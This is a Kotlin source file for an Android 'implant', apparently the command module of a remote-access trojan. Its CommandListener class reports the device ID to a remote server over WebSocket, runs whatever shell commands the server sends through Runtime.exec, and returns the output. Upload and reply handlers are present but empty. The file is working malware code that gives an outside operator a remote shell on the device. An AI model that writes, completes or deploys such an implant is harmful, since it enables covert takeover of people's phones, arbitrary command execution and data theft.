package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import com.cooperthecoder.implant.Networking
import com.cooperthecoder.implant.data.DeviceProperties
import com.cooperthecoder.implant.model.Command
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.io.BufferedReader
import java.io.InputStreamReader

class CommandListener(private val context: Context) : WebSocketListener() {

    companion object {
        val TAG = CommandListener::class.java.name
        const val EXECUTE = "execute"
        const val REPLY = "reply"
        const val UPLOAD = "upload"
    }
    override fun onOpen(webSocket: WebSocket, response: Response) {
        Log.d(CommandService.TAG, "WebSocket opened.")
        val arguments = hashMapOf<String, String>(
                "deviceId" to DeviceProperties.deviceId(context)
        )
        val command = Command.Builder()
                .command("ready")
                .arguments(arguments)
                .build()
        webSocket.send(command.json())
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        val command: Command = try {
            Command.fromJson(text)
        } catch (e: Exception) {
            Log.e(CommandService.TAG, "Error parsing JSON from: $text.", e)
            e.printStackTrace()
            return
        }
        Log.d(CommandService.TAG, "Command received: $text")

        when (command.command) {
            EXECUTE -> {
                val shellCommand = command.arguments.get("shell_command")
                if (shellCommand != null) {
                    handleExecute(webSocket, shellCommand)
                }
            }

            REPLY -> {
                val nonce = command.arguments.get("nonce")
                val output = command.arguments.get("output")
                if (nonce != null && output != null) {
                    handleReply(webSocket, nonce, output)
                }
            }

            UPLOAD -> {
                val filename = command.arguments.get("filename")
                if (filename != null) {
                    handleUpload(webSocket, filename)
                }
            }
        }
    }

    fun handleExecute(socket: WebSocket, shellCommand: String) {
        Log.d(TAG, "Executing: $shellCommand")
        val process = try {
            Runtime.getRuntime().exec(shellCommand)
        } catch (e: Exception) {
            Log.d(TAG, "Error running command", e)
            return
        }
        process.waitFor()

        val reader = BufferedReader(InputStreamReader(process.inputStream))
        val outputBuffer = StringBuffer()
        reader.forEachLine {
            outputBuffer.append(it)
        }
        val arguments = hashMapOf<String, String>(
                "nonce" to "1234-2564-7585",
                "output" to outputBuffer.toString()
        )
        val command = Command.Builder()
                .command(REPLY)
                .arguments(arguments)
                .build()

        socket.send(command.json())
        Log.d(TAG, "Output is: $outputBuffer")
    }

    fun handleUpload(socket: WebSocket, filename: String) {

    }

    fun handleReply(socket: WebSocket, nonce: String, output: String) {

    }
}